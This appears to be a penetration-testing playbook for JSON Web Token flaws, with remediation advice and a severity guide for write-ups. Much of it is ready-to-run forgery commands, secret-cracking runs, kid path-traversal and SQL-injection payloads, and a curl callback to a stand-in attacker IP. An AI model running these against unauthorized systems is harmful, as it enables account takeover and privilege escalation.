# JWT attack catalogue — precondition, command, confirmation, remediation

For every attack: **confirmation is a replay** of the forged token against a
protected endpoint (`GET https://api.example.com/v1/me` style) where the
response matches the valid-token baseline and reflects the tampered claims.
Save the exact request/response pair as `http_exchange` evidence.

## 1. alg:none / null signature

- **Precondition**: server-side library honors the token's `alg` header, or a
  parser skips verification when the signature segment is empty. Common in
  pre-2016 libraries, hand-rolled parsers, and "decode" used where "verify" was meant.
- **Command**: `jwt_tool <JWT> -X a` (four case variants) and `jwt_tool <JWT> -X n`.
  Forge claims in the same shot: `jwt_tool <JWT> -X a -I -pc role -pv admin`.
- **Confirm**: any of the emitted tokens (note trailing `.` — empty signature)
  accepted on replay; tampered claims honored (admin data returned).
- **Remediation**: enforce an allowlist of expected algorithms server-side
  (never read `alg` from the token); use `verify()` not `decode()`.

## 2. RS256→HS256 key confusion (CVE-2016-5431 / CVE-2016-10555 class)

- **Precondition**: verification call passes the RSA public key to a function
  that accepts both RSA and HMAC algorithms and trusts the token's `alg`.
  You need the public key PEM. Sources, in order of effort:
  1. JWKS: `curl -s https://api.example.com/.well-known/jwks.json`
     (also `/jwks.json`, `/.well-known/openid-configuration` → `jwks_uri`,
     `/auth/realms/<realm>` for Keycloak, `/oauth2/v3/certs` style paths).
     Convert JWK (`n`,`e`) → PEM: jwt_tool does this internally with `-jw`;
     standalone, use any jwk-to-pem utility or rsa_sign2n output.
  2. Token header: embedded `jwk` claim, or `x5c` (base64 DER cert →
     `openssl x509 -pubkey -noout` after wrapping in PEM markers).
  3. TLS certificate of the issuer (occasionally reused):
     `openssl s_client -connect api.example.com:443 </dev/null | openssl x509 -pubkey -noout > public.pem`.
  4. **Recover from two tokens**: silentsignal rsa_sign2n `jwt_forgery.py <t1> <t2>`
     — emits candidate PEMs and pre-signed HS256 probe tokens.
- **Command**: `jwt_tool <JWT> -X k -pk public.pem`, then
  `jwt_tool <JWT> -X k -pk public.pem -I -pc user -pv admin`.
  PEM byte-exactness matters: try both encodings rsa_sign2n emits (with/without
  trailing newline, PKCS1 vs SPKI) — the HMAC key is the raw file bytes.
- **Confirm**: HS256-signed token accepted where the original was RS256.
- **Remediation**: pin the algorithm family per key; separate HMAC and RSA
  verification code paths.

## 3. JWKS spoofing — inline `jwk`, remote `jku` / `x5u`

- **Precondition**: verifier trusts key material referenced *by the token*:
  an embedded `jwk` header (CVE-2018-0114), or fetches `jku`/`x5u` URLs without
  a strict allowlist.
- **Commands**:
  - Inline: `jwt_tool <JWT> -X i` — self-signed with an embedded public JWK.
  - Remote: `jwt_tool <JWT> -X s -ju 'https://203.0.113.7/jwks.json'` — serve
    the JWKS jwt_tool writes (`python3 -m http.server` behind TLS, or any host
    you control). If `jku` is domain-allowlisted, chain an **open redirect** on
    the allowed domain, path traversal in the allowlist check
    (`https://trusted.example.com@203.0.113.7/`), or an upload endpoint on the
    trusted host. Match the original `kid` in your JWKS (edit
    `~/.jwt_tool/jwtconf.ini` or the emitted jwks file).
- **Confirm**: token accepted; for `-X s`, your server receives the JWKS fetch
  (watch access logs — the fetch alone proves the SSRF-ish trust, acceptance
  proves forgery).
- **Remediation**: ignore in-token key material; resolve `kid` only against a
  pinned, server-side key set.

## 4. Weak HMAC secret

- **Precondition**: `alg` is HS256/384/512 and the secret is guessable
  (defaults: `secret`, `password`, `changeme`, framework defaults, app name).
- **Command**: `jwt_tool <JWT> -C -d jwt.secrets.list`, escalate to
  `rockyou.txt`, then `hashcat -a 0 -m 16500 jwt.txt <list>` and rules
  (`-r best64.rule`), masks (`-a 3 -m 16500 jwt.txt '?l?l?l?l?l?l'`).
- **Confirm**: `[+] <secret> is the CORRECT key!`; then forge
  `jwt_tool <JWT> -I -pc role -pv admin -S hs256 -p '<secret>'` and replay.
  Cracking alone is a finding; replayed forgery with escalated claims is the
  high-impact proof.
- **Remediation**: ≥256-bit random secret, or switch to asymmetric signing.

## 5. kid header injection

The verifier looks up the verification key by the `kid` header. Attacker
controls `kid` → attacker influences which key is used.

- **Path traversal** — key is read from a file path built from `kid`:
  - `/dev/null` → empty key:
    `jwt_tool <JWT> -I -hc kid -hv '../../../../../dev/null' -S hs256 -p ''`
    (or just `-X b` for the blank-key signature with the original kid).
  - Predictable file whose content you know/guess:
    `jwt_tool <JWT> -I -hc kid -hv '../../../../../etc/hostname' -S hs256 -p '<hostname>'`
    (also try app-relative files: `static/js/app.js`, `robots.txt` under webroot,
    `/proc/sys/kernel/randomize_va_space` → `2\n`).
- **SQL injection** — `kid` goes into a key-lookup query; make it return a value
  you choose: `jwt_tool <JWT> -I -hc kid -hv "nonexistent' UNION SELECT 'aaa' -- -" -S hs256 -p 'aaa'`.
  Vary quoting/comment syntax per DBMS. A time-based payload in `kid`
  (`'||pg_sleep(5)--`) confirms the injection even before forgery.
- **Command/template injection** — if `kid` hits a shell or template, standard
  OOB payloads (`"|curl 203.0.113.7|"`) — confirm via callback.
- **Confirm**: token signed with your chosen key accepted.
- **Remediation**: treat `kid` as an opaque index into a server-side map;
  reject unknown values.

## 6. Claim tampering, expiry and replay issues

Only meaningful once a signing bypass (§1–5) works — except the acceptance
bugs, which need no forgery:

- **Privilege/identity claims**: `sub`, `user_id`, `uid`, `email`, `username`,
  `role`, `roles`, `groups`, `admin`/`isAdmin`, `scope`/`scp`, `permissions`,
  `tenant_id`/`org_id`. Flip them one at a time; diff responses. `-M er`/`-M cc`
  fuzz these automatically against a live target.
- **Expired-token acceptance**: replay a token past `exp` → if accepted, `exp`
  isn't enforced. A token with **no `exp`** or a multi-year lifetime is a
  finding on its own (eternal session).
- **`nbf`/`iat` ignored**, **`aud`/`iss` not enforced**: a token minted for
  service A (`aud: billing`) accepted by service B; a token from the staging
  issuer accepted in prod. Test with any second environment/token you hold.
- **jti/replay**: logout or password-reset, then replay the old token — no
  server-side revocation is common and reportable.
- **Remediation**: validate `exp`/`nbf`/`aud`/`iss` strictly; short lifetimes;
  server-side revocation for sensitive flows; never derive authorization solely
  from client-presented claims without integrity *and* freshness.

## 7. Severity guide (for the finding write-up)

- Signature bypass with privilege escalation (any of §1–5 → admin): critical.
- Signature bypass, horizontal access only: high.
- Cracked secret (no replay yet) / eternal tokens / missing aud-iss: medium-high
  depending on token reach.
Defer exact CVSS/field rules to the imported `finding-report` skill.
